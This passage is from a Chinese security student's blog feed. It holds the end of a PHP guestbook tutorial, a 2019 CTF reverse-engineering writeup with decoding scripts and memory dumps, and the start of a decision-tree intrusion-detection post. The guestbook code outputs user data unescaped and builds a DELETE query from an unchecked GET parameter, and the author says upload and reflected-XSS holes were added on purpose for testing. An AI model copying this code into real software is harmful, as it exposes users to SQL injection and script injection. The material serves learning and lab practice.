 </span><br><span class="line">       <span class="comment">/*****************/</span> </span><br><span class="line">       <span class="comment">//防CSRF</span></span><br><span class="line">       <span class="variable">$check</span>= <span class="variable">$_COOKIE</span>['PHPSESSID'];<span class="comment">//$_COOKIE['PHPSESSID'];</span></span><br><span class="line">       <span class="comment">/*****************/</span> </span><br><span class="line">        <span class="comment">//数据库连接  </span></span><br><span class="line">        <span class="variable">$con</span> = @mysqli_connect(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">"*******"</span>,<span class="string">"test"</span>);  </span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$con</span>)&#123;  </span><br><span class="line">            die(<span class="string">"数据库连接错误"</span>.mysqli_connect_error());  </span><br><span class="line">        &#125;  </span><br><span class="line">        mysqli_query(<span class="variable">$con</span>,<span class="string">"set names 'utf8'"</span>);  </span><br><span class="line">        <span class="comment">//显示每页的留言数  </span></span><br><span class="line">        <span class="variable">$pagesize</span> = 8;  </span><br><span class="line">        <span class="comment">//确定页数p参数  </span></span><br><span class="line">        @<span class="variable">$p</span> = <span class="variable">$_GET</span>['p']?<span class="variable">$_GET</span>['p']:1;  </span><br><span class="line">        <span class="comment">//数据指针  </span></span><br><span class="line">        <span class="variable">$offset</span> = (<span class="variable">$p</span>-1)*<span class="variable">$pagesize</span>;  </span><br><span class="line">        <span class="comment">//查询本页现实的数据 </span></span><br><span class="line">session_start();</span><br><span class="line">        <span class="variable">$id</span>=<span class="variable">$_SESSION</span>[<span class="string">"uid"</span>];</span><br><span class="line">        <span class="variable">$query_sql</span> = <span class="string">"select * from text"</span>;<span class="comment">// where user= '$id' order by user desc limit $offset,$pagesize";  </span></span><br><span class="line">        # echo <span class="variable">$query_sql</span>;  </span><br><span class="line">        <span class="variable">$result</span> = mysqli_query(<span class="variable">$con</span>,<span class="variable">$query_sql</span>);  </span><br><span class="line"><span class="comment">/*if (!$result) &#123;</span></span><br><span class="line"><span class="comment">printf("Error: %s\n", mysqli_error($con));</span></span><br><span class="line"><span class="comment">exit();</span></span><br><span class="line"><span class="comment">&#125;*/</span></span><br><span class="line">        <span class="comment">//循环输出  </span></span><br><span class="line">echo <span class="string">"&lt;div style='margin-top:55px'&gt;"</span>;</span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$res</span> = mysqli_fetch_array(<span class="variable">$result</span>))&#123;</span><br><span class="line">echo <span class="string">"&lt;div class='k'&gt;"</span>;</span><br><span class="line">echo <span class="string">"&lt;div class='ds-post-main'&gt;"</span>;</span><br><span class="line">echo "&lt;div <span class="keyword">class</span>='<span class="keyword">ds</span>-comment-body'&gt;</span><br><span class="line">            &lt;span&gt;&#123;<span class="variable">$res</span>['author']&#125;  于  &#123;<span class="variable">$res</span>['time']&#125;  给我留言&lt;/span&gt;</span><br><span class="line">&lt;span style='float:right'&gt;&lt;a href = 'del.php?id=<span class="string">".$res['id']."</span>&amp;check=<span class="string">".$check."</span>'&gt;&lt;<span class="keyword">input</span> <span class="keyword">type</span>='submit' <span class="keyword">class</span>='button1' value='删除'&gt;&lt;/<span class="keyword">input</span>&gt;&lt;/a&gt;&lt;/span&gt;</span><br><span class="line">&lt;p&gt;留言主题 : &#123;<span class="variable">$res</span>['title']&#125;   留言地址 : &lt;span&gt;&#123;<span class="variable">$res</span>['ip']&#125;&lt;/span&gt;&lt;/p&gt;</span><br><span class="line">            &lt;hr width=450px&gt; </span><br><span class="line">&lt;p&gt;&#123;<span class="variable">$res</span>['liuyan']&#125;&lt;/p&gt;&lt;/div&gt;&lt;<span class="keyword">br</span>&gt;";</span><br><span class="line">echo <span class="string">"&lt;/div&gt;"</span>;</span><br><span class="line">echo <span class="string">"&lt;/div&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">echo <span class="string">"&lt;/div&gt;"</span>;</span><br><span class="line">        <span class="comment">//分页代码  </span></span><br><span class="line">        <span class="comment">//计算留言总数  </span></span><br><span class="line">        <span class="variable">$count_result</span> = mysqli_query(<span class="variable">$con</span>,<span class="string">"select count(*) as count from text where user= '$id'"</span>);  </span><br><span class="line">        <span class="variable">$count_array</span> = mysqli_fetch_array(<span class="variable">$count_result</span>);  </span><br><span class="line">      </span><br><span class="line">        <span class="comment">//计算总的页数  </span></span><br><span class="line">        <span class="variable">$pagenum</span> = <span class="built_in">ceil</span>(<span class="variable">$count_array</span>['<span class="keyword">count</span>']/<span class="variable">$pagesize</span>);  </span><br><span class="line">        <span class="comment">//echo '共',$count_array['count'],'条留言';  </span></span><br><span class="line"><span class="comment">//echo '共',$pagenum,'页';</span></span><br><span class="line">        echo <span class="string">"&lt;center&gt;"</span>;</span><br><span class="line">        echo <span class="string">"&lt;div style='display: inline-block;margin-right: 15px;margin-left:15px;'&gt;"</span>,'共',<span class="variable">$count_array</span>['<span class="keyword">count</span>'],'条留言','&lt;/div&gt;';  </span><br><span class="line">echo <span class="string">"&lt;div style='display: inline-block;margin-right: 15px;margin-left:15px;'&gt;"</span>,'共',<span class="variable">$pagenum</span>,'页','&lt;/div&gt;';  </span><br><span class="line">      </span><br><span class="line">        <span class="comment">//循环输出个页数及链接  </span></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$pagenum</span>&gt;1)&#123;  </span><br><span class="line">            <span class="keyword">for</span>(<span class="variable">$i</span> = 1;<span class="variable">$i</span>&lt;=<span class="variable">$pagenum</span>;<span class="variable">$i</span>++)&#123;  </span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$i</span> == <span class="variable">$p</span>)&#123;  </span><br><span class="line">                    echo <span class="string">"&lt;div style='background:#e8ffc4;width:25px;display: inline-block;margin-right: 10px;'&gt;"</span>,<span class="variable">$i</span>,<span class="string">"&lt;/div&gt;"</span>;</span><br><span class="line">                      </span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">                    <span class="comment">//echo  '&lt;a href="show.php?p=',$i,'"&gt;',$i,'&lt;/a&gt;';</span></span><br><span class="line">echo '&lt;a href=<span class="string">"show.php?p=',$i,'"</span>&gt;',<span class="string">"&lt;div style='width:25px;display: inline-block;margin-right: 10px;background:#FF9D6F'&gt;"</span>,<span class="variable">$i</span>,'&lt;/div&gt;','&lt;/a&gt;';</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">echo <span class="string">"&lt;div style='display: inline-block;margin-right: 10px;'&gt;"</span>,'当前在 ',<span class="variable">$p</span>, ' 页',<span class="string">"&lt;/center&gt;&lt;/div&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">echo <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">echo <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">echo <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">echo <span class="string">"&lt;/div&gt;"</span>;</span><br><span class="line">    ?&gt;</span><br><span class="line">&lt;script <span class="keyword">type</span>=<span class="string">"text/javascript"</span>&gt; </span><br><span class="line">      function logout()&#123; </span><br><span class="line">        &lt;% </span><br><span class="line">          session.invalidate(); <span class="comment">//运用invalidate()比较好，退出时使session失效</span></span><br><span class="line">        %&gt; </span><br><span class="line">      &#125;</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">    &lt;/body&gt;  </span><br><span class="line">    &lt;/html&gt;</span><br></pre></td></tr></table></figure><h2 id="3-4-删除"><a href="#3-4-删除" class="headerlink" title="3.4 删除"></a>3.4 删除</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    header(<span class="string">"content-type:text/html;charset=utf-8"</span>);</span><br><span class="line">session_start();</span><br><span class="line">    <span class="keyword">require_once</span> <span class="string">"connet.php"</span>;</span><br><span class="line">    <span class="keyword">require_once</span> <span class="string">'mysqlconfig.php'</span>;</span><br><span class="line">    $ma1=<span class="keyword">new</span> DB();</span><br><span class="line">    $link=$ma1-&gt;connect();</span><br><span class="line">$id = $_GET[<span class="string">'id'</span>];</span><br><span class="line">    $uid=$_SESSION[<span class="string">"uid"</span>];</span><br><span class="line"><span class="comment">/******************************/</span> </span><br><span class="line"><span class="comment">//校验token</span></span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'check'</span>]== $_COOKIE[<span class="string">'PHPSESSID'</span>])&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"cookie校验通过"</span>;</span><br><span class="line"><span class="comment">//referer请求头检测;</span></span><br><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">'HTTP_REFERER'</span>]==<span class="string">"http://127.0.0.1/show.php"</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"referer校验通过"</span>;</span><br><span class="line">    <span class="keyword">if</span>($link)&#123;</span><br><span class="line">       $sql=<span class="string">"delete from text where id =$id "</span>;</span><br><span class="line">       <span class="comment">//echo "$sql";</span></span><br><span class="line"><span class="keyword">if</span>($uid==<span class="string">'admin'</span>)</span><br><span class="line">&#123;</span><br><span class="line">       $que=mysqli_query($link,$sql);</span><br><span class="line"><span class="keyword">if</span>($que)&#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('删除成功，返回首页');location='show.php';&lt;/script&gt;"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('删除失败');location='show.php'&lt;/script&gt;"</span>;</span><br><span class="line">   <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('权限不够,删除失败');location='show.php'&lt;/script&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"referer校验失败"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"cookie校验失败"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">``` </span><br><span class="line"></span><br><span class="line"><span class="comment">## 3.5 数据库登录预设&amp;处理</span></span><br></pre></td></tr></table></figure><p>&lt;?php<br>    define(‘DB_HOST’, ‘localhost’);<br>    define(‘DB_USER’, ‘root’);<br>    define(‘DB_PWD’, ‘<strong>***</strong>‘);  //我数据库密码<br>    define(‘DB_CHARSET’, ‘UTF8’);<br>    define(‘DB_DBNAME’, ‘test’);<br>?&gt;<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></p><p>&lt;?php<br>   class DB{<br>       function connect(){<br>           @$link = mysqli_connect(DB_HOST,DB_USER,DB_PWD);//连接数据库<br>           mysqli_set_charset($link,DB_CHARSET);//设置数据库字体格式<br>           mysqli_select_db($link,DB_DBNAME) or die(‘数据库打开失败’);//选择数据库<br>          if(mysqli_connect_errno())<br>        {<br>        die(‘数据库连接失败 : ‘.mysqli_connect_errno());<br>        }<br>        return $link;<br>    }<br>    function insert($link,$sql){<br>      if (mysqli_query($link, $sql)) {<br>          echo “<script language="javascript"> alert(‘注册成功!’);location=’index.php’; </script>“;<br>      } else {<br>          echo “Error insert data: “ . $link-&gt;error;<br>      }</p><pre><code> }function CheckUser($link,$sql){  $result = mysqli_query($link,$sql);  $row = mysqli_num_rows($result);  if($row != 0){    return true;    }  else{    return false;    } }function insertl($link,$sql){   if (mysqli_query($link, $sql)) {       echo &quot;&lt;script language=&apos;javascript&apos;&gt; alert(&apos;留言成功!&apos;);location=&apos;show.php&apos;; &lt;/script&gt;&quot;;    } else {       echo &quot;Error insert data: &quot; . $link-&gt;error;   } } function print1($link,$sql){    $result = mysqli_query($link,$sql);    $data = array();    while ($row = mysqli_fetch_array($result)) {      $data[] = $row;    }    if ($data) {      return $data;    } else {      return false;    }  }</code></pre><p>}<br>?&gt;<br><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta"># 4. 功能总结</span></span><br><span class="line"></span><br><span class="line">允许用户注册 并给留言板留言</span><br><span class="line"></span><br><span class="line">看不到真实的账号 只有上后台数据库才能看到留言对应的真实账号</span><br><span class="line"></span><br><span class="line">只有admin用户才能删除留言</span><br><span class="line"></span><br><span class="line">为了测试上传漏洞和反射型XSS漏洞在add.php处随便加了个上传的和显示<span class="keyword">get</span>参数的地方</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta"># 5. bug调试</span></span><br><span class="line"></span><br><span class="line"><span class="meta">## 5.1 只能看见自己给自己的留言</span></span><br><span class="line">这个buy很蠢 修改一下 show.php里的sql查询代码就行了</span><br></pre></td></tr></table></figure></p><p>$query_sql = “select * from text”;// where user= ‘$id’ order by user desc limit $offset,$pagesize”;<br><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">## 5.2 数据库id为设置成自增</span></span><br><span class="line">导致删除的时候 把所有的数据都删了, 给<span class="built_in">id</span>设置自增就行了</span><br></pre></td></tr></table></figure></p><p>alter table table_name modify id int auto_increment;<br><code>`</code></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;1 2班贼麻烦的操作系统安全和信息内容安全 4班还有啥数据挖掘什么的 &lt;br&gt;对比起来3班简直就是养老班 整一学期主修课就考一门你敢信 其他几门就交个报告&lt;br&gt;养老班也挺好 做自己别的东西 考雅思 GRE &lt;br&gt;最近刷到6.5了 终于说出去不太丢人了 加油啊 看到点 7 7 6.5 6.5的希望了&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    
    <category term="Web" scheme="http://Ronpa.top/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>2019国赛writeup</title>
    <link href="http://ronpa.top/2019/04/21/2019%E5%9B%BD%E8%B5%9Bwriteup/"/>
    <id>http://ronpa.top/2019/04/21/2019%E5%9B%BD%E8%B5%9Bwriteup/</id>
    <published>2019-04-21T14:01:06.000Z</published>
    <updated>2021-01-25T19:17:13.014Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>退役了不打比赛了</p></blockquote><a id="more"></a><h1 id="day-1"><a href="#day-1" class="headerlink" title="day 1"></a>day 1</h1><p>flag{92094daf-33c9-431e-a85a-8bfbd5df98ad}</p><p>C00001A1C0 string  </p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -- coding: utf-8 --</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#tGRBtXMZgD6ZhalBtCUTgWgZfnkTgqoNsnAVsmUYsGtCt9pEtDEYsql3</span></span><br><span class="line"></span><br><span class="line"><span class="string">def</span> <span class="string">base64_decode():</span></span><br><span class="line">    <span class="string">a</span> <span class="string">=</span> <span class="string">[]</span> <span class="string">*</span> <span class="number">100</span>  <span class="comment"># 用于存原文对应的值</span></span><br><span class="line">    <span class="string">flag</span> <span class="string">=</span> <span class="string">''</span></span><br><span class="line">    <span class="string">List</span> <span class="string">=</span> <span class="string">'ABCDEFGHIJSTUVWKLMNOPQRXYZabcdqrstuvwxefghijklmnopyz0123456789+/='</span></span><br><span class="line">    <span class="string">List</span> <span class="string">=</span> <span class="string">'6789_-abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ012345'</span></span><br><span class="line">    <span class="string">for</span> <span class="string">i</span> <span class="string">in</span> <span class="string">range(len(m)):</span></span><br><span class="line">        <span class="string">if</span> <span class="string">(i</span> <span class="string">+</span> <span class="number">1</span><span class="string">)</span> <span class="string">%</span> <span class="number">4</span> <span class="string">==</span> <span class="attr">0:</span></span><br><span class="line">            <span class="string">ch4</span> <span class="string">=</span> <span class="string">List.find(m[i])</span></span><br><span class="line">            <span class="string">ch3</span> <span class="string">=</span> <span class="string">List.find(m[i</span> <span class="bullet">-</span> <span class="number">1</span><span class="string">])</span></span><br><span class="line">            <span class="string">ch2</span> <span class="string">=</span> <span class="string">List.find(m[i</span> <span class="bullet">-</span> <span class="number">2</span><span class="string">])</span></span><br><span class="line">            <span class="string">ch1</span> <span class="string">=</span> <span class="string">List.find(m[i</span> <span class="bullet">-</span> <span class="number">3</span><span class="string">])</span></span><br><span class="line">            <span class="string">ret1</span> <span class="string">=</span> <span class="string">ch1</span> <span class="string">&lt;&lt;</span> <span class="number">2</span> <span class="string">|</span> <span class="string">ch2</span> <span class="string">&gt;&gt;</span> <span class="number">4</span> <span class="string">&amp;</span> <span class="number">0x3</span></span><br><span class="line">            <span class="string">ret2</span> <span class="string">=</span> <span class="string">ch2</span> <span class="string">&lt;&lt;</span> <span class="number">4</span> <span class="string">&amp;</span> <span class="number">0xFF</span> <span class="string">|</span> <span class="string">ch3</span> <span class="string">&gt;&gt;</span> <span class="number">2</span> <span class="string">&amp;</span> <span class="number">0xF</span></span><br><span class="line">            <span class="string">ret3</span> <span class="string">=</span> <span class="string">ch3</span> <span class="string">&lt;&lt;</span> <span class="number">6</span> <span class="string">&amp;</span> <span class="number">0xFF</span> <span class="string">|</span> <span class="string">ch4</span> <span class="string">&amp;</span> <span class="number">0x3F</span></span><br><span class="line">            <span class="string">a.append(ret1)</span></span><br><span class="line">            <span class="string">if</span> <span class="string">m[i</span> <span class="bullet">-</span> <span class="number">1</span><span class="string">]</span> <span class="string">==</span> <span class="string">'='</span><span class="string">:</span>  <span class="comment"># 两个‘=’时，最后两位都是0，不需要</span></span><br><span class="line">                <span class="string">break</span></span><br><span class="line">            <span class="string">a.append(ret2)</span></span><br><span class="line">            <span class="string">if</span> <span class="string">m[i]</span> <span class="string">==</span> <span class="string">'='</span><span class="string">:</span>  <span class="comment"># 一个‘=’时，最后一位是0，不需要</span></span><br><span class="line">                <span class="string">break</span></span><br><span class="line">            <span class="string">a.append(ret3)</span></span><br><span class="line">    <span class="attr">for i in a:</span></span><br><span class="line">        <span class="string">flag</span> <span class="string">+=</span> <span class="string">chr(i)</span></span><br><span class="line">    <span class="string">print</span> <span class="string">flag</span></span><br><span class="line"></span><br><span class="line"><span class="string">if</span> <span class="string">__name__</span> <span class="string">==</span> <span class="string">"__main__"</span> <span class="string">:</span></span><br><span class="line">    <span class="string">m='tGRBtXMZgD6ZhalBtCUTgWgZfnkTgqoNsnAVsmUYsGtCt9pEtDEYsql3'</span></span><br><span class="line">    <span class="string">base64_decode()</span></span><br></pre></td></tr></table></figure><p>0x39c9e2 -&gt; 0x39d34c</p><h1 id="day2"><a href="#day2" class="headerlink" title="day2"></a>day2</h1><p>国密sm4特征值<br><img src="/2019/04/21/2019国赛writeup/sm4.png" alt><br>IJLMNOPKABDEFGHCQRTUVWXSYZbcdefa45789+/6ghjklmnioprstuvqwxz0123y</p><p>len(‘RVYtG85NQ9OPHU4uQ8AuFM+MHVVrFMJMR8FuF8WJQ8Y=’)=44<br>解密后的 EF468DBAF985B2509C9E200CF3525AB6</p><p>password &amp; 1BA5590 rsi</p><p>变化后的指令<br>00007FFE8278EC10  01 00 00 00 00 00 00 00  D1 FD 44 F8 27 DA 78 00<br>00007FFE8278EC20  A8 86 FC 60 8C 50 11 00  78 9B 3C CA DB 4A 42 00<br>00007FFE8278EC30  DC DA 33 71 F3 DF 1E 00  31 57 2F B7 30 6F 2D 00<br>00007FFE8278EC40  D5 60 75 D1 38 6F 64 00  AD E4 50 F1 C9 9E 6A 00<br>00007FFE8278EC50  B7 51 6D C1 78 C4 47 00  55 08 5A 92 C0 4A 65 00<br>00007FFE8278EC60  73 4D 2B E7 03 CD 2A 00  71 A6 A5 09 78 60 6C 00<br>00007FFE8278EC70  BA B5 68 DF 73 16 06 00  C0 17 CF BE B0 23 77 00<br>00007FFE8278EC80  65 DC 53 4B E7 D4 4C 00  15 EC 82 C2 96 0F 1D 00</p><p>00007FFE1D96B610  01 00 00 00 00 00 00 00  D1 FD 44 F8 27 DA 78 00<br>00007FFE1D96B620  A8 86 FC 60 8C 50 11 00  78 9B 3C CA DB 4A 42 00<br>00007FFE1D96B630  DC DA 33 71 F3 DF 1E 00  31 57 2F B7 30 6F 2D 00<br>00007FFE1D96B640  D5 60 75 D1 38 6F 64 00  AD E4 50 F1 C9 9E 6A 00<br>00007FFE1D96B650  B7 51 6D C1 78 C4 47 00  55 08 5A 92 C0 4A 65 00<br>00007FFE1D96B660  73 4D 2B E7 03 CD 2A 00  71 A6 A5 09 78 60 6C 00<br>00007FFE1D96B670  BA B5 68 DF 73 16 06 00  C0 17 CF BE B0 23 77 00</p><h2 id="sm4后的指令-不变化"><a href="#sm4后的指令-不变化" class="headerlink" title="sm4后的指令 不变化"></a>sm4后的指令 不变化</h2><p>01 00 00 00 00 00 00 00  D1 FD 44 F8 27 DA 78 00<br>A8 86 FC 60 8C 50 11 00  78 9B 3C CA DB 4A 42 00<br>DC DA 33 71 F3 DF 1E 00  31 57 2F B7 30 6F 2D 00<br>D5 60 75 D1 38 6F 64 00  AD E4 50 F1 C9 9E 6A 00<br>B7 51 6D C1 78 C4 47 00  55 08 5A 92 C0 4A 65 00<br>73 4D 2B E7 03 CD 2A 00  71 A6 A5 09 78 60 6C 00<br>BA B5 68 DF 73 16 06 00  C0 17 CF BE B0 23 77 00<br>65 DC 53 4B E7 D4 4C 00  15 EC 82 C2 96 0F 1D 00<br>09 2B 51 86 76 7C 54 00  BC 3C 38 B9 C1 65 1B 00<br>7F D8 09 70 96 D7 6D 00  7A 21 D9 29 86 FB 0A 00<br>8B 24 7C 43 14 0D 49 00  BE CF C5 9B 82 FC 1E 00<br>B6 E1 83 76 F3 8E 5B 00  9F 84 64 1D 5A DE 54 00<br>82 A3 1F FA 31 8A 06 00  4C A6 09 0F 76 70 47 00<br>EB 5B 5D 91 44 6D 63 00  BC 67 2B 98 68 1E 62 00<br>E6 E1 D2 5F CF 25 38 00  F6 F4 94 E7 57 D0 4C 00<br>57 53 B9 BE 96 26 77 00  C0 CF 3B FB 07 FD 45 00<br>DD C7 3D B4 5E 50 66 00  A4 2C E8 D9 ED 7F 00 00</p><h3 id="用户名-abcdefge-password-zxcvbn"><a href="#用户名-abcdefge-password-zxcvbn" class="headerlink" title="用户名:abcdefge password:zxcvbn"></a>用户名:abcdefge password:zxcvbn</h3><p>v33 = E5 3A E2 4A 2D 70 C7 A1  F9 23 23 83 D8 8A BD A0</p><p>s =<br>45 35 33 41 45 32 34 41  32 44 37 30 43 37 41 31  E53AE24A2D70C7A1<br>46 39 32 33 32 33 38 33  44 38 38 41 42 44 41 30  F9232383D88ABDA0</p><p>RUVsQVVrGNNrRMdoQseJFVYxF8FrFs4sRM4wQVBNQUI=<br>RUVsQVVrGNNrRMdoQseJFVYxF8FrFs4sRM4wQVBNQUI=</p><p><strong><em>factors found</em></strong></p><p>P309 = 1657407551907933046558545060527940723781810462521183676934573856328183290<br>41540419488625472007710062128632942664366383551452498541560538744582922713808611<br>32017677040158767461812188571995383112248728097841811038059735874791542092805386<br>0076414097300832349400288770613227105348835005596365488460445438176193451867<br>P309 = 1657407551907933046558545060527940723781810462521183676934573856328183290<br>41540419488625472007710062128632942664366383551452498541560538744582922713808611<br>32017677040158767461812188571995383112248728097841811038059735874791542092805386<br>0076414097300832349400288770613227105348835005596365488460445438176193451867<br>P309 = 1657407551907933046558545060527940723781810462521183676934573856328183290<br>41540419488625472007710062128632942664366383551452498541560538744582922713808611<br>32017677040158767461812188571995383112248728097841811038059735874791542092805386<br>0076414097300832349400288770613227105348835005596365488460445438176193451867<br>P309 = 1657407551907933046558545060527940723781810462521183676934573856328183290<br>41540419488625472007710062128632942664366383551452498541560538744582922713808611<br>32017677040158767461812188571995383112248728097841811038059735874791542092805386<br>0076414097300832349400288770613227105348835005596365488460445438176193451867</p><p>ans = 1</p><p>pysm4安装地址<a href="https://github.com/yang3yen/pysm4" target="_blank" rel="noopener">https://github.com/yang3yen/pysm4</a><br><img src="/2019/04/21/2019国赛writeup/pysm4.png" alt></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;退役了不打比赛了&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    
    <category term="Writeup" scheme="http://Ronpa.top/tags/Writeup/"/>
    
  </entry>
  
  <entry>
    <title>Machine-Learning-for-IDS-Decision-Tree代码详解</title>
    <link href="http://ronpa.top/2019/04/16/Machine-Learning-for-IDS-Decision-Tree%E4%BB%A3%E7%A0%81%E8%AF%A6%E8%A7%A3/"/>
    <id>http://ronpa.top/2019/04/16/Machine-Learning-for-IDS-Decision-Tree%E4%BB%A3%E7%A0%81%E8%AF%A6%E8%A7%A3/</id>
    <published>2019-04-16T01:16:47.000Z</published>
    <updated>2020-02-12T09:08:06.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>在中期答辩前 优化了一遍寒假弄的决策树代码<br>紧跟着队友的脚步改用了超级方便的pandas库来储存数据<br>修改了剪枝条件和特征值的分裂条件<br>优化了最后的结果显示 加上了训练时间和预测时间<br>在数据量非常大的时候 四百万+的数据量 测试正确率在0.999几<br>最有优势的点就是速度了 训练速度和预测速度是svm完全比不上的<br>看队友报告里写 完整跑完数据要六个小时<br>哈哈哈 我只要27秒</p></blockquote><a id="more"></a><h1 id="零-代码总览"><a href="#零-代码总览" class="headerlink" title="零. 代码总览"></a>零. 代码总览</h1><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line">import pandas as pd</span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection import train_test_split</span><br><span class="line"><span class="keyword">from</span> sklearn.feature_extraction import DictVectorizer #特征转换器</span><br><span class="line"><span class="keyword">from</span> sklearn.tree import DecisionTreeClassifier</span><br><span class="line"><span class="keyword">from</span> sklearn.metrics import classification_report</span><br><span class="line"><span class="keyword">from</span> sklearn import tree</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1.数据获取</span></span><br><span class="line"><span 